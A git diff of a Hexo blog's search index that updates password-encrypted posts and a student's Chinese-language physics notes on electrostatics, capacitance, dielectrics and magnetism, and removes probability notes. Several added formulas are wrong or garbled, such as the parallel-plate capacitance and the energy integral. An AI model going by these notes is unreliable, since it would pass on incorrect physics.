70fdde247b48ce23a4e9f2a2033592a9335fd16ca241124bdd2d485e2a7734b943126a2c475bbbab6cd6e561dcc9fedf977dbdd5ffe870ca837c309e02a63e1b5d05820605403f73c1deb66ce8c16265de7bcf637cb75842206475f45daabffc9ab17b3d96825551ec102d21924b21872b5e9373a985c406568fe48d8d46f72a4b186b1247c193394a279248966d36e32d9bc6bba2827421b02570969ee75e9030f53c0e7029111ce97a13c69218304c1cf9d873a23df66386c3897d81583bc48c254edaaea1c814bf4f8b47400f3daa5334f092c0dbbea22e8889d79f418616cd2c9e5030b52b686e4926228d50d61d6950d3eed48065441d72399cda4b002ac7d0ea8f087d48c5304e2eac5694d5a53ec8b9f687c927eb29371b25f7e7db3a7ac2be38f94c7b573eeaa8e08ecf3294025d540006476533f2bfe9b6d342e6b7741d8ffa7078f083b5e85dd7098549d9bdbb2b18af433f36900c117ed51867a0773baccfcc2eacddad8495818acda29e4837992de0329019e463fa75e8ff3032b7c9844bb2b96401d5b94c51414f5ac26800d9ac8fa91dc5b1498868dd1614192a3f878a23de864cfc26af5f1324ec56b935accd9f85727eef6282fc3be70d4825c95719878c86d934335bb39653efd4636cac3b65e7b493014bd96877b49d1982fd131a15a073eaa2b3fccf90c2c917a7a51c188544aa9ac339c5154b61962b508b2330126deaa211107d0d2713239b77a246af74c5ad6da4cad7a087d595f80e8e056b093d1f637e291e3f59fdd4ecd68fb0848817adc4a9c83fe10d2c4186019cc8759c859ed90c99713f71a44b983652d43c0e09dcb27ac0ed88fb79c96e2e95be260bdb2829590e5410a14eeb5169303922f94f2ea8100c746a968718b9a51929b7da73d03ae15f79279879d844cfbcb07b93dad7637dfe9453b7b3caf1dbce1d1f3daf231d39984ceadd2572e99aec2866b644872340e6f6bd9ed4514ed1fb10a751cd1500c8aaac5a19db4d3764f19506882fe1296278913569acd23e5dd46261edfe36edce86cca14d9acead3b28b5f625f3133fed6152919fbe9d55f5c9e4d13b5fe63ee3f14ca23fc4da15d5e2b7daab456696bad2ecf362e6511b970060885368a59abc2ed4a99f0711d3740f9084d6797bb5f94441509a613519734df8ed6756a6441ff489151696b57f0dc58c5ffed88f85e7a6ad11492c73b0612cb0dffd78e18288883bdcd97fa9d677ba8afc22bf04dafcf1b2431bac32478a6538456da6f1441aaf375bf84fd68e2c0b523698fdf71c8bb33839b389802fbda57c69effe04b95a358e91ec4ef00c4dadd9aadd3daf66b80f628b626c1904e946507b43889d2c450f2d53f8fdb5c1c4d5b64b41cd9fcceae08e5c0638c8670e4afd96b9b53d85ee5099a52fac1188b05a2666a96e5ea2272a18f67c5cf809392de04fc252bcc3079d8b760e2e4d00b8c99793ace841aecaf660d7ac32e504974af2e2a3e99944299663490988ef8f0a13c581ce7fa0c635ec24da7cf7ccac0ef22ea49697b6946b73ed39f09587ec57abf5ecfa349e618474dbe994bc401534311686f84dd1565ff741f57ae9360540ef21c1f541b2a9eb08db1734c6522112b50269cc58282e71cc6a555307d1eefa40253f505b9deef351f192afeeb9a9713912224086bf786310668ed424a882d5761a6f11f6dd8bd9771118641cc20fccb3fe156ad2407993907861fa308c252ac13df4f5c82135f2175f6a4ba0b58d793ffa07da109a4cba836f6bc57df0a900e51cedd1a69675bdc87062fe7e071de7c2ab8ed1940065c6f34cdcc598611b4b5c8d3ac19eb75d364046d233a03fcaf495fae77ff88552691921435d244d7c7c76419f68792c7f1820fbb0ad388b9f3aa2806dc5cc01937f7742a8ee5963776164</script>
+  <div class="hbe hbe-content">
+    <div class="hbe hbe-input hbe-input-default">
+      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
+      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
+        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
+      </label>
+    </div>
+  </div>
+</div>
+<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
       <categories>
-        <category>develop</category>
+        <category>随笔</category>
       </categories>
       <tags>
-        <tag>linux</tag>
-        <tag>android</tag>
+        <tag>encrypted</tag>
       </tags>
   </entry>
   <entry>
@@ -2517,31 +2545,9 @@
       </tags>
   </entry>
   <entry>
-    <title>十九——热爱杀105个人的你</title>
-    <url>/2021/07/09/%E5%8D%81%E4%B9%9D.html</url>
-    <content><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="抱歉, 这个文章不能被校验, 不过您还是能看看解密后的内容.">
-  <script id="hbeData" type="hbeData" data-hmacdigest="94c178d8444f654825ecd7ac9d68343b0f2e09fbd724e4a7c94fb1dc93f2115f">6fcf1523ddce79b7eefea9a75525b5245de786104bf519d9988408b867bdf551bd0c68bfb36652de0234a851b59b631ffe9d78a9e0290bfff0952c565a4257c23f889a6206ebd9cee2e4e4b13fb740ec32d5f036c78c189b8c30cd311f0c44bcdf9ddedfd6c66bfdfc2bb4a0a23eb7a62d13e83184952540545ea7150454871ae24d80818cfeeb6aa2471f860b72b98c56bbbd4702503971a324dd6df6dd21507ec37799310b591df3f60c43021e13c24c306c1bd047d188eda2c534bb899685046131a268390326c442e9b92300fba7c5e795cd9656b2583900e08e83af6cdebba87ed3eb840c9a0930d0840b98b55775745e3a51ed3b8799fc0fb35ba9aaa30609febde5b587e16d318882d844c49395260b433fbcad4aa40ee1c13c8c92c11b2ffc9ff0ffc6ef3a954b2eba60d60d4fe83175fdb345cfb5237817cd30cafe08b03688ccfe29ee92a4b0983a7250cf3a3b5a7714b5b7b9ea10a8551d6169a1e264e2d875e05a5bc06775052f8b54db8fbc867406ca28a0d25bc6ceb75fbe69a81ccf0b8a46b7b1cafbacdd2d4440409bacd5a5ca47a6cd63e6bdf00f5b12ae625048224e45096089475d2a3bf009fedf0c2509f4d376c15546d6d11b1c557ae8ac7bf3eccc6ef48d0089031334044ce468d18ba98e17391209acafa85bbd84a9373a347c43da6169cc7afc6984d75600760b79ddb00c737934ac7e1421099ed2fcbe13777cb89fe74095bc790d5359848bc78dd8b53f57b15c3e9bf6d5e2fd13771d13c8c805823f6a3ac020a9f226ae7389800f5698cd1603697c83fbd3b0821a0f4917f11dbf7f50a7b9d2a8d05567578766b8c999adbff17736abaa0c239212d3b7b2d46e868408e2a066e5a75a7df09490dd6bf960a230dd647a4551e4134001bfffbe4d3d93436f0acfa477515cb2ca9db2aef73d9ecbe48ff710c7af184e16e371803d9d513c23fe8e2b781fd956299900b65ebed0f8d9f9440386f9f53daac08c932422f9fda4bdd50719ef716b39f2b72e4daccc4ea52bcf1e9f80acf551db813ef2c57e4bef4a4731b754e30476ce41e668f69be2a39ed124dee0305407cd00a8c7437c7a2aa7704718d9f891643614acfd40d6433f6489f6ddf3f9e7eb8c53ff6236558df5c90ac63c6f4b2e3365eb01313290a88670e8c5e9e1e06a484b389bea41673f315347ff37348a5dce8d855a37409fe38c6c4627de1fd0622669e618ee20873e01d0b11c7a854ad52968c5b3b5b88fb8d9ce2f828f9c94affc17cdc1801d6dc3055adc1088f28f02e90d985febb92204c39e88e61c855a400543de14d7177d7c96916b95cd2ca540b4bfaf05862ca8703be44dfeb8c6b5f14cb4419cc28d5183dc8a004c9add7f843d8561effc7fe1221c10decba0e2b54c45d332ff756b3fa2cc4ab22c2618d947a37d8ccf74512a19c42b810d72bcfec4d23c86cae1788108b907d4eaf3a8a5a0d3963a7069d6ce2c2774a6cf1425b5f12edd73f3b1d0783c35fb3f7c5c4b827681339f633e3e8493dd80feed98fe524a3523cf425ddb389e55e53de2083451f40376b6a229730db2886d8ca18f20852fa626ee415fab94a1c4dd1b82da6b19f466eb81594f5398979cef96d790e24261944a5100523a8c79b4286f93e51c95c16132a43d3bf2a6dfebec61dd7fa4d6c1d4b7f2bc218d2db30cf6a8874dd66a27f4c14f57ea4765b025f1a56f565f3f445df510cb1547a8af694bdf9184683b4e08cf1cdd4152dcdd88a8e0b218bf4bb264bc8f5ebe0ea7b601041990a4375ea19a256808ea0057d187947249c742596ec322924313866e290d5f41b4ad4ea6d9c87cf0906cc782b6d2a3d236450aed0475a8b27c5844879674d47f3f9a7572a32a4316f32c5f51a14c42d0eec47ff46e6c8127df6d06acb5e17cc7dbca3a9fb0a5ef0c12148ad88580cfd1c827e5db80f0a9ddd0b7f1143d3656c62b0aa6bb7d58c7ef3bc05a402dd9dcb86fac2f64cbb6a31c433e9c1c25f64a1923aa521b573ef26f00f7d403cb90ae3369008af56ec5124f00226881f4032eb7721a184c3b4d6f138e504b5a090eefd957c6a15f2002b37546f7cf8599840049f8b45f4881d276a11e821ecd07bbd79feb12031f1f07c7f863fabb3c4183b2922818ccc4f72ac1b32e8a8ad9d7ae5ea0120d6d5e46aefbe859b2652a6be4eaaafa63152ace1ef535fc1cfc3cf618fed176e8c7ae14387181d01f8d86ace5b0ebec37a3aec1d359b11c6f031a2d41a1ddaeba8f66aa101047944f8c007853aefa0e2f898e7718d1fe924def4e31d17a7632ef0fe93d4bef9d3b077345f5b5f047c96283e6aade5ab6a74d95f34575c21c53799cddb704509e2563bd9d5b289d08f6654981371993e5fa149a36c3c3a4fd0e2e0c355a669f3956389fc4f8e85cb5f5dc0d81bb21ce3b6db99aa8b96dd80f9b4ddf0b4d02f5d16bd82501f4c2c331c64a81c9fdc94713915bf68bdfcb58dc899c7f7eb221731c12db7825300bf3be5f47fcbafe603ee557645f8ea2ef5b7f04af981883b38c36b00827bb1da549beea10c3e30bfb085c91bb7dc37b1d5c944cfb9792aeb824ecf0ec230f57c1cdb7f3117b83ec7fa837ac07901b4d50e398a0afa80653d425f1d0e090e1de715d24a92241e7a261a765a53e0c06069704070f255b129ad29d6b77bb6f25ffb5177dd2bf7dbb7615cd51df4dc16e5234aebcc87b014c4660cd41cfa27711441c52e485aa6debd518150ce120ea905f5acf12504967c36573e28b1fc679d6f99b7c1db0aa2c7506b36c80a37681239852d49d61063c11658cad1244f9ceafc18fc230fcb119cbccff91f8dece36225d24a7b8e7c860663321a05f7d1f9fd06e0d3b22dec429c8fbdef0e896bdf60a5a66dd395fae4d4633323e1334f26da1901ed3921ba5dd172b7a5121c9c11325153574ecf983799cfea9a3ff33ac2ea933753c6fcb7fa84c0dd29fc15321672fa70ed8fc539c387538a209b1d255258cf09f7ebb989c8313c76c73f44cb1341a56eda95dbfd517ba5f7b4e4d23617705ff7c6dd35f0dafe201161ed85933adbf0e5005a4ea8ce273ea411dbe12c31f951ba52af87c72c004714e5c960bf1dac643cfb6899c06b4ad049d7bc091e89caa91925cdcec615c679aba6e093aca1565966ff003c696efa0b55c1f7d06e46d2390b99bac7bab0d562b2ada02ecad709f8a005b55ddc170e76baadba583254c98c5c555159f959ae8b436823242e9927d283b1f890140297bff1d3d4ba5e70ca7014f75b62fb514486d475ea12ea7f7385c4a3b50d6c3e1ee7380597d2a5e13e4cd608344a85265b1fc25bedefe35e4fb28c73c40ce93af66c9df52bb807baf52ae0a3c4340c6ddfc603ef5137d2f412022a4b656d0f1e476dd780d46da2ba44140c2e86340f5a4468eea8ffd779679c932d125196c37b576458981ca5166a03ac139a8661b0c6b4f2d9ca055be6cfaf5a7c77c991f52749966497fe4d9f2b266b36fc1f6c9807867336f95800bb3f1b4b750e3fcd5e82f5a765e569de32d23fe6316907157101deaf73bc42c0b4e52cba55d8bd1c8321089782e66fe4d2d2dcd69378b38f38916471864636aa30eb1096b4d57371ee8fff2b9baa9640cf7633e235fa675ef3c7dd645e39e9fe3c5102ed7cc5925ded9b29edccc23f8eab94e9dac8630ce2d5c03ceff59a0f695a12efb0c5ad41a3c82b098e2c0e5201ec23239848c5f4e34e4646a91799043f8325f193de60b7a0289b77890c7c93e36e003ee26759b39368fd862c849f1500c53cbdf8d4e19dd6037d7f11632024decc9b7fb3e761d153a0c5469960e6c0fc8b1b0541d7fe813a1a0681e9d12b97a64eaf301795108563f7668550320c7daa7885f859e2800f9a46c3b6a2dbd0af63d1235158c60466a8ebec1a396ae37af9b985ac27e6772c4d976dadad097c16207030f27500b2df15c23551df53f87b6afe81c43982e34257bfd3880e9236ea05132e194a1ae8913c5000c8c8c16f8dd1b4a0b2bca4c673106ea63248811c363bff3fffeca60e48a0f2f66388b4996bdc6a8040825d4ba3e1253ae8c97a6f70fb24448dc027f8f57982b1b2482d8feb4ee0a47c8cc6d30ee052b54d5406867e40f0c94c3a306661819adbd7b9cb827f06d983d69e0bfb70146305ea05b6b371b321db9a926a1ef3fa2e8b5f23558091d137ff27aa7d3925a86f833c5f1f2b67fd81268d66b0db1758bdf5f90b13f5f39c0febb3f54bc302944b41110496f6a727fccd9f176caed752720d265567e4f1c22e685ac6ccdd7b0b1d2e63432a7ebaefbc9750865ecb1c1ef22d6cc79b1d9787d316c02a1001dfc68d1c9f0effb1be992de21107d1c364c0b1deb43228ee10561b2f28b61b2f07f0b19788f527ee189fe984b55a57005cc4df743fe79873c2d202a990cd28c5068c1493cc5ccc4bbc16407015ecfb724dca2ded3ac3ee15075e9b1edaabe1b20104df155d457265550bc770f150d4b1c7ce4166008de92c2991d391b3f64c5312990cfdf4273260736730fe3e216c88bcf7c8bb37dfd0c442b01ad6b3272e3fd6a2c5af3d06c19596615eaa893fc0f45719419f15f561bd13732c99978468f0f80aca8b180368a389520a34b2c850b81a5de068baf932f3de48950a538cfd4cb3310c404a1be9749fe147437d52e564a7826e3ffaba80d1359a8447cc0918f0e12efc8e07ee95bceceb8b21dcf0ebf1188e958e4e7e74f173a2fcc39d2811d8c2c39ffc1c7a3f275e51f4fda282adb96f12c528d3856325623dd5960dc47151d41a1d0358254de758099bd09a1f9ff66273701733bb17b5d87358d3353c3b51060b570c1a9e0c53b4f235a0d4825028b79d63b5b80186d924e24ee08ab99dfdfcc405b9358fd0c99cae94082171095b6a39a70fdde247b48ce23a4e9f2a2033592a9335fd16ca241124bdd2d485e2a7734b943126a2c475bbbab6cd6e561dcc9fedf977dbdd5ffe870ca837c309e02a63e1b5d05820605403f73c1deb66ce8c16265de7bcf637cb75842206475f45daabffc9ab17b3d96825551ec102d21924b21872b5e9373a985c406568fe48d8d46f72a4b186b1247c193394a279248966d36e32d9bc6bba2827421b02570969ee75e9030f53c0e7029111ce97a13c69218304c1cf9d873a23df66386c3897d81583bc48c254edaaea1c814bf4f8b47400f3daa5334f092c0dbbea22e8889d79f418616cd2c9e5030b52b686e4926228d50d61d6950d3eed48065441d72399cda4b002ac7d0ea8f087d48c5304e2eac5694d5a53ec8b9f687c927eb29371b25f7e7db3a7ac2be38f94c7b573eeaa8e08ecf3294025d540006476533f2bfe9b6d342e6b7741d8ffa7078f083b5e85dd7098549d9bdbb2b18af433f36900c117ed51867a0773baccfcc2eacddad8495818acda29e4837992de0329019e463fa75e8ff3032b7c9844bb2b96401d5b94c51414f5ac26800d9ac8fa91dc5b1498868dd1614192a3f878a23de864cfc26af5f1324ec56b935accd9f85727eef6282fc3be70d4825c95719878c86d934335bb39653efd4636cac3b65e7b493014bd96877b49d1982fd131a15a073eaa2b3fccf90c2c917a7a51c188544aa9ac339c5154b61962b508b2330126deaa211107d0d2713239b77a246af74c5ad6da4cad7a087d595f80e8e056b093d1f637e291e3f59fdd4ecd68fb0848817adc4a9c83fe10d2c4186019cc8759c859ed90c99713f71a44b983652d43c0e09dcb27ac0ed88fb79c96e2e95be260bdb2829590e5410a14eeb5169303922f94f2ea8100c746a968718b9a51929b7da73d03ae15f79279879d844cfbcb07b93dad7637dfe9453b7b3caf1dbce1d1f3daf231d39984ceadd2572e99aec2866b644872340e6f6bd9ed4514ed1fb10a751cd1500c8aaac5a19db4d3764f19506882fe1296278913569acd23e5dd46261edfe36edce86cca14d9acead3b28b5f625f3133fed6152919fbe9d55f5c9e4d13b5fe63ee3f14ca23fc4da15d5e2b7daab456696bad2ecf362e6511b970060885368a59abc2ed4a99f0711d3740f9084d6797bb5f94441509a613519734df8ed6756a6441ff489151696b57f0dc58c5ffed88f85e7a6ad11492c73b0612cb0dffd78e18288883bdcd97fa9d677ba8afc22bf04dafcf1b2431bac32478a6538456da6f1441aaf375bf84fd68e2c0b523698fdf71c8bb33839b389802fbda57c69effe04b95a358e91ec4ef00c4dadd9aadd3daf66b80f628b626c1904e946507b43889d2c450f2d53f8fdb5c1c4d5b64b41cd9fcceae08e5c0638c8670e4afd96b9b53d85ee5099a52fac1188b05a2666a96e5ea2272a18f67c5cf809392de04fc252bcc3079d8b760e2e4d00b8c99793ace841aecaf660d7ac32e504974af2e2a3e99944299663490988ef8f0a13c581ce7fa0c635ec24da7cf7ccac0ef22ea49697b6946b73ed39f09587ec57abf5ecfa349e618474dbe994bc401534311686f84dd1565ff741f57ae9360540ef21c1f541b2a9eb08db1734c6522112b50269cc58282e71cc6a555307d1eefa40253f505b9deef351f192afeeb9a9713912224086bf786310668ed424a882d5761a6f11f6dd8bd9771118641cc20fccb3fe156ad2407993907861fa308c252ac13df4f5c82135f2175f6a4ba0b58d793ffa07da109a4cba836f6bc57df0a900e51cedd1a69675bdc87062fe7e071de7c2ab8ed1940065c6f34cdcc598611b4b5c8d3ac19eb75d364046d233a03fcaf495fae77ff88552691921435d244d7c7c76419f68792c7f1820fbb0ad388b9f3aa2806dc5cc01937f7742a8ee5963776164</script>
-  <div class="hbe hbe-content">
-    <div class="hbe hbe-input hbe-input-default">
-      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
-      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
-        <span class="hbe hbe-input-label-content hbe-input-label-content-default">您好, 这里需要密码.</span>
-      </label>
-    </div>
-  </div>
-</div>
-<script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
-      <categories>
-        <category>随笔</category>
-      </categories>
-      <tags>
-        <tag>encrypted</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>（不定期更新）大物上笔记</title>
     <url>/2022/09/26/%E5%A4%A7%E7%89%A9%E7%AC%94%E8%AE%B0.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>大物上本质就是微积分.</p>
+    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>大物上本质就是微积分，只不过对微分变量的选取更加讲究。</p>
 <span id="more"></span>
 <h1 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h1><h2 id="电场强度（场强）"><a href="#电场强度（场强）" class="headerlink" title="电场强度（场强）"></a>电场强度（场强）</h2><p><img src="/2022/09/26/%E5%A4%A7%E7%89%A9%E7%AC%94%E8%AE%B0/image-20220908165345686.png"></p>
 <p><img src="/2022/09/26/%E5%A4%A7%E7%89%A9%E7%AC%94%E8%AE%B0/image-20220908165946582.png"></p>
@@ -2567,12 +2573,62 @@
 <p>电势是标量,可以直接累加.</p>
 <blockquote>
 <script type="math/tex; mode=display">A_{12}=W_1-W_2=\int_{r_{p_1}}^{r_{p_2}}\vec{F} \cdot \mathrm{d} \vec{r}=q\int_{r_{p_1}}^{r_{p_2}}\vec{E} \cdot \mathrm{d} \vec{r}</script><script type="math/tex; mode=display">\frac{A_{12}}{q}=\varphi_{p_1}-\varphi_{p_2}=|{\Delta\varphi _{p_1 p_2}}|</script></blockquote>
-<h3 id="常用电势"><a href="#常用电势" class="headerlink" title="常用电势"></a>常用电势</h3><p>点电荷的电势: $\varphi=\frac{1}{4\pi\epsilon_0}\frac{q}{r}$</p>
-<p>连续带电体的电势分布: $\varphi=\frac{1}{4\pi\epsilon_0}\int\frac{\mathrm{d}q}{r}$</p>
+<h3 id="常用电势"><a href="#常用电势" class="headerlink" title="常用电势"></a>常用电势</h3><p>点电荷的电势: $\varphi=\frac{1}{4\pi\varepsilon_0}\frac{q}{r}$</p>
+<p>连续带电体的电势分布: $\varphi=\frac{1}{4\pi\varepsilon_0}\int\frac{\mathrm{d}q}{r}$</p>
 <p>带电球壳的内部电势相同(因为内部场强为0),在球壳外,电势与球心距离成反比.</p>
 <p>带电$q$细圆环的电势直接将$r$换为$\sqrt{R^2+x^2}$即可.</p>
 <h3 id="用电势求场强"><a href="#用电势求场强" class="headerlink" title="用电势求场强"></a>用电势求场强</h3><script type="math/tex; mode=display">\vec{E}=-\frac{\partial \varphi}{\partial n}\vec{e_n}=-\nabla\varphi</script><p>大部分情况只考虑一元,也就是<script type="math/tex">-\frac{\mathrm{d} \varphi}{\mathrm{d} n}\vec{e_n}</script>的情况.</p>
 <p>其中大小为<script type="math/tex">|-\frac{\mathrm{d} \varphi}{\mathrm{d} n}\vec{e_n}|=-\frac{\mathrm{d} \varphi}{\mathrm{d} n}</script>,方向为<script type="math/tex">\vec{e_n}</script>.</p>
+<h1 id="第六章"><a href="#第六章" class="headerlink" title="第六章"></a>第六章</h1><h2 id="导体的静电平衡"><a href="#导体的静电平衡" class="headerlink" title="导体的静电平衡"></a>导体的静电平衡</h2><p>如果两个带电体相距足够远，可以看作它们<strong>电势相等</strong>。</p>
+<p>如果物体接地，代表物体<strong>电势为0</strong>，但并不代表物体没有感应电荷。</p>
+<h2 id="电容和电容器"><a href="#电容和电容器" class="headerlink" title="电容和电容器"></a>电容和电容器</h2><p>首先电容的定义式为$C=\frac{Q}{U}$，跟高中相同。</p>
+<p>对于平行板电容器，有电荷面密度$\sigma$：</p>
+<script type="math/tex; mode=display">U_{AB}=\int_A^B \vec{E} \cdot \mathrm{d}\vec{r} = Ed = \frac{\sigma d}{\varepsilon_0}</script><script type="math/tex; mode=display">C=\frac{Q}{U_{AB}}=\frac{\sigma S}{d}</script><p>对于球形电容器，设两球壳分别带电$\pm{q}$</p>
+<script type="math/tex; mode=display">U_{AB}=\int_A^B \vec{E} \cdot \mathrm{d}\vec{r} = \int_{R_1}^{R_2}\frac{q}{4\pi\varepsilon_0r^2}\mathrm{d}r = \frac{q}{4\pi\varepsilon_0}(\frac{1}{R_1}-\frac{1}{R_2})</script><script type="math/tex; mode=display">C=\frac{Q}{U_{AB}}=\frac{4\pi\varepsilon_0 R_1 R_2}{R_2 - R_1}</script><blockquote>
+<p>特别地，孤立导体球的电容是$4\pi\varepsilon_0R$，即$R_2$趋向于正无穷的情况。</p>
+</blockquote>
+<p>电容器串联，等效电容的倒数等于各个电容的倒数和。</p>
+<p>电容器并联，等效电容等于各个电容的和。（与电阻相反）</p>
+<h2 id="静电场中的电介质"><a href="#静电场中的电介质" class="headerlink" title="静电场中的电介质"></a>静电场中的电介质</h2><p>几个新物理量<script type="math/tex">\vec{E_源},\vec{E_新},\vec{D},\sigma_0,\vec{P},\sigma '</script>的关系（$\varepsilon_r$为相对电容率）？</p>
+<script type="math/tex; mode=display">E_源=\varepsilon_0 E_新</script><script type="math/tex; mode=display">\sigma_0=D=\varepsilon_0 \varepsilon_r E_新</script><script type="math/tex; mode=display">P=(\varepsilon_r-1)\varepsilon_0E_新</script><script type="math/tex; mode=display">\sigma '=\pm P</script><p>引进电位移矢量<script type="math/tex">\vec{D}=\varepsilon_0\vec{E}+\vec{P}</script>，有$\vec{D}$的高斯定理<script type="math/tex">\oint_S \vec{D} \cdot \mathrm{d}\vec{S}=\Sigma q_{0i}</script></p>
+<blockquote>
+<p>注意右侧没有$\frac{1}{\varepsilon_0}$</p>
+</blockquote>
+<h2 id="静电能计算"><a href="#静电能计算" class="headerlink" title="静电能计算"></a>静电能计算</h2><ul>
+<li><p>用电势：<script type="math/tex">W_e=\frac{1}{2}\Sigma q_i\varphi_i / \frac{1}{2}\int\varphi\mathrm{d}q, \mathrm{d}q=\lambda\mathrm{d}l / \sigma\mathrm{d}S  / \rho\mathrm{d}V</script></p>
+</li>
+<li><p>用能量密度：<script type="math/tex">w_e=\frac{1}{2}\varepsilon_0E^2=\frac{1}{2}\varepsilon_0\varepsilon_rE^2=\frac{1}{2}DE</script>，然后<script type="math/tex">W_e=\int\mathrm{d}w_e=\int_V W_e \mathrm{d}V</script></p>
+</li>
+<li><p>对于电容器：<script type="math/tex">W_e=\frac{Q^2}{2C}=\frac{1}{2}QU=\frac{1}{2}CU^2</script></p>
+</li>
+</ul>
+<h1 id="第七章"><a href="#第七章" class="headerlink" title="第七章"></a>第七章</h1><h2 id="恒定电流"><a href="#恒定电流" class="headerlink" title="恒定电流"></a>恒定电流</h2><p>电流的微分公式$I=\frac{\mathrm{d}q}{\mathrm{d}t}$</p>
+<p>电流密度$\vec{j}=nq\vec{u}$</p>
+<p>电流连续性方程$\oint\vec{j}\cdot\mathrm{d}\vec{S}=-\frac{\mathrm{d}q}{\mathrm{d}t}=0$（流出），恒定电流</p>
+<p>欧姆定律的微分形式$\vec{j}=\gamma\vec{E}$</p>
+<p>电阻的积分形式$R=\int_L\frac{\rho \mathrm{d}l}{s}, \rho=\frac{1}{\gamma}$</p>
+<p>电动势<script type="math/tex">ℰ=\int_-^+\vec{E} \cdot \mathrm{d} \vec{l}=\frac{A}{q},A=\int_-^+\vec{F} \cdot \mathrm{d}\vec{l},\vec{F}=q\vec{E}</script>，注意这里的力都是非静电力，$ℰ$方向为电源负极指向正极。</p>
+<h2 id="磁场"><a href="#磁场" class="headerlink" title="磁场"></a>磁场</h2><h3 id="比奥-萨法尔定律"><a href="#比奥-萨法尔定律" class="headerlink" title="比奥-萨法尔定律"></a>比奥-萨法尔定律</h3><p>$\mathrm{d}B=\frac{\mu_0}{4\pi} \frac{I\mathrm{d}\vec{l}\times\vec{e_r}}{r^2}$，其中$I\mathrm{d}\vec{l}$为电流元，$\vec{e_r}$的方向为电流源指向所求点的方向。</p>
+<p>$\vec{B}=\int \mathrm{d}\vec{B}=\int\frac{\mu_0}{4\pi} \frac{I\mathrm{d}\vec{l}\times\vec{e_r}}{r^2}$</p>
+<blockquote>
+<p>以下为了方便去掉$B$的箭头。</p>
+</blockquote>
+<p>无限长载流导线的磁感应强度：$B=\frac{\mu_0 I}{2\pi r_0}$，半无限长就除以2。</p>
+<p>载流圆线圈轴线上一点磁感应强度：$B=\frac{\mu_0 I R^2}{2 r^3}, r=\sqrt{R^2+x^2}$</p>
+<blockquote>
+<p>当$x=0$时，$B=\frac{\mu_0 I}{2R}$</p>
+</blockquote>
+<p>长直密绕螺线管轴线上一点磁感应强度：$B=\frac{\mu_0nI}{2}(\sin \beta_2-\sin \beta_1)$，这里的$\beta$是与y轴正向的夹角。</p>
+<blockquote>
+<p>当螺管无限长，$B=\mu_0 n I$，半无限长就除以2。</p>
+</blockquote>
+<h3 id="安培环路定理"><a href="#安培环路定理" class="headerlink" title="安培环路定理"></a>安培环路定理</h3><h3 id="运动电荷在磁场中受力"><a href="#运动电荷在磁场中受力" class="headerlink" title="运动电荷在磁场中受力"></a>运动电荷在磁场中受力</h3><p>洛伦兹力：$\vec{f}=q\vec{v}\times\vec{B}$</p>
+<h3 id="载流导线在磁场中受力"><a href="#载流导线在磁场中受力" class="headerlink" title="载流导线在磁场中受力"></a>载流导线在磁场中受力</h3><p>非闭合型：$\vec{F}=\int \mathrm{d}\vec{F}=\int_L I\mathrm{d}\vec{l} \times \vec{B}$</p>
+<p>闭合型（圆形、矩形）：</p>
+<ul>
+<li>磁矩：$\vec{m}=IS\vec{e_n}$</li>
+<li>磁力矩：$\vec{M}=\vec{m}\times\vec{B}$</li>
+</ul>
 ]]></content>
       <categories>
         <category>笔记</category>
@@ -2612,134 +2668,6 @@
       <tags>
         <tag>cpp</tag>
       </tags>
-  </entry>
-  <entry>
-    <title>（不定期更新）概统笔记</title>
-    <url>/2022/09/26/%E6%A6%82%E7%BB%9F.html</url>
-    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><script class="meting-secondary-script-marker" src="\assets\js\Meting.min.js"></script><p>顺便用作$\LaTeX$练习.</p>
-<span id="more"></span>
-<h1 id="成绩分布"><a href="#成绩分布" class="headerlink" title="成绩分布"></a>成绩分布</h1><p>卷面成绩：50%</p>
-<p>平时成绩：50%</p>
-<ul>
-<li>平时作业</li>
-<li>期中+小测</li>
-<li>非标</li>
-<li>随堂表现</li>
-</ul>
-<h1 id="特点"><a href="#特点" class="headerlink" title="特点"></a>特点</h1><p>理解性、记忆性</p>
-<p>微积分功底</p>
-<p>题型固定</p>
-<h1 id="笔记"><a href="#笔记" class="headerlink" title="笔记"></a>笔记</h1><h2 id="概率论基础"><a href="#概率论基础" class="headerlink" title="概率论基础"></a>概率论基础</h2><p>用$A,B,C$等表示事件</p>
-<p>$\overline{A}$表示A的对立事件（对立是互斥的充分条件）</p>
-<p>$AB=A\cap B$</p>
-<p>$A-B=A\overline{B}=A-AB$</p>
-<p>$\overline{A\cap B}=\overline{A}\cup\overline{B}$</p>
-<p>$\overline{A\cup B}=\overline{A}\cap\overline{B}$</p>
-<p>发生B后再发生A的概率$P(A|B)=\frac{P(AB)}{P(B)}$，其中$P(B)&gt;0$</p>
-<p>全概率公式：设<script type="math/tex">B_1, ... ,B_m</script>为完备事件组，则<script type="math/tex">P(A)=\sum_{i=1}^m{P(A|B_i)P(B_i)}</script></p>
-<p>贝叶斯公式：设<script type="math/tex">B_1,B_2 ... B_m</script>为完备事件组，则<script type="math/tex">P(B_i|A)=\frac{P(B_iA)}{P(A)}=\frac{P(B_i)P(A|B_i)}{\sum_{i=1}^m{P(A|B_i)P(B_i)}}</script>，即贝叶斯公式是乘法公式与全概率公式的组合。</p>
